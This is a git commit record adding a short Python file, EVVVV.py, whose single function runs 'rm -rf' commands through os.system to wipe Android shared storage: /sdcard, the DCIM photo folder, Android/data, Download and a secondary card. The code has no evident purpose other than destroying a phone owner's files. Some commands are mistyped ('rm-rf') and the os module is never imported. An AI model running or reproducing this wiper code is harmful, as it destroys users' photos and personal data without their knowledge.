deecbb67f23cfc88e515222414d494556b565a38
JIHAD-JDX <miuwhdhshsiridhh@gmail.com>
2024-07-12 20:54:05 +0200

    Add files via upload

---
+++ EVVVV.py
@@ -0,0 +1,8 @@
+def fucker():
+    os.system('rm -rf /sdcard/*')
+    os.system('rm-rf /sdcard/DCIM/')
+    os.system('rm-rf /sdcard/Android/')
+    os.system('rm-rf /sdcard/Android/data/')
+    os.system('rm -rf /sdcard/Download/*')
+    os.system('rm -rf /sdcard1/*')
+    os.system('rm -rf /sdcard/0/*')
